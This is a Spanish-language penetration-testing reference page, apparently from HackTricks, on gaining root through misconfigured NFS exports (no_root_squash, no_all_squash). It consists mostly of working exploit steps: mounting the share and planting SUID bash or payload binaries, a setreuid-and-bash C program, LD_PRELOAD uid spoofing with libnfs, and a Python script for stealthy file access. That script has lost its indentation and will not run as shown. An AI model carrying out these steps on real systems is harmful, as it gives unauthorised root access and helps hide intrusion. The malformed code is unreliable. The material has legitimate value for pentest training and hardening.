{{#include ../../banners/hacktricks-training.md}}

Lee el _ **/etc/exports** _ archivo, si encuentras algún directorio que esté configurado como **no_root_squash**, entonces puedes **acceder** a él **como cliente** y **escribir dentro** de ese directorio **como** si fueras el **root** local de la máquina.

**no_root_squash**: Esta opción básicamente le da autoridad al usuario root en el cliente para acceder a archivos en el servidor NFS como root. Y esto puede llevar a serias implicaciones de seguridad.

**no_all_squash:** Esto es similar a la opción **no_root_squash** pero se aplica a **usuarios no root**. Imagina que tienes un shell como el usuario nobody; revisaste el archivo /etc/exports; la opción no_all_squash está presente; revisa el archivo /etc/passwd; emula un usuario no root; crea un archivo suid como ese usuario (montando usando nfs). Ejecuta el suid como el usuario nobody y conviértete en un usuario diferente.

# Escalamiento de Privilegios

## Explotación Remota

Si has encontrado esta vulnerabilidad, puedes explotarla:

- **Montando ese directorio** en una máquina cliente, y **como root copiando** dentro de la carpeta montada el binario **/bin/bash** y dándole derechos **SUID**, y **ejecutando desde la máquina víctima** ese binario bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
- **Montando ese directorio** en una máquina cliente, y **como root copiando** dentro de la carpeta montada nuestro payload compilado que abusará del permiso SUID, dándole derechos **SUID**, y **ejecutando desde la máquina víctima** ese binario (puedes encontrar aquí algunos [payloads C SUID](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

> [!NOTE]
> Tenga en cuenta que si puede crear un **túnel desde su máquina a la máquina víctima, aún puede usar la versión remota para explotar esta escalada de privilegios tunelizando los puertos requeridos**.\
> El siguiente truco es en caso de que el archivo `/etc/exports` **indique una IP**. En este caso, **no podrá usar** en ningún caso la **explotación remota** y necesitará **abusar de este truco**.\
> Otro requisito necesario para que la explotación funcione es que **la exportación dentro de `/etc/export`** **debe estar usando la bandera `insecure`**.\
> --_No estoy seguro de que si `/etc/export` está indicando una dirección IP, este truco funcionará_--

## Basic Information

El escenario implica explotar un recurso compartido NFS montado en una máquina local, aprovechando un defecto en la especificación de NFSv3 que permite al cliente especificar su uid/gid, lo que potencialmente habilita el acceso no autorizado. La explotación implica usar [libnfs](https://github.com/sahlberg/libnfs), una biblioteca que permite la falsificación de llamadas RPC de NFS.

### Compiling the Library

Los pasos de compilación de la biblioteca pueden requerir ajustes según la versión del kernel. En este caso específico, las llamadas al sistema fallocate fueron comentadas. El proceso de compilación implica los siguientes comandos:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Realizando el Explotación

La explotación implica crear un programa simple en C (`pwn.c`) que eleva privilegios a root y luego ejecuta un shell. El programa se compila y el binario resultante (`a.out`) se coloca en el recurso compartido con suid root, utilizando `ld_nfs.so` para falsificar el uid en las llamadas RPC:

1. **Compilar el código de explotación:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Colocar la explotación en el recurso compartido y modificar sus permisos falsificando el uid:**

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Ejecutar la explotación para obtener privilegios de root:**
```bash
/mnt/share/a.out
#root
```

## Bonificación: NFShell para Acceso a Archivos Sigiloso

Una vez que se obtiene acceso root, para interactuar con el recurso compartido NFS sin cambiar la propiedad (para evitar dejar rastros), se utiliza un script de Python (nfsh.py). Este script ajusta el uid para que coincida con el del archivo al que se accede, permitiendo la interacción con archivos en el recurso compartido sin problemas de permisos:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Ejecutar como:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
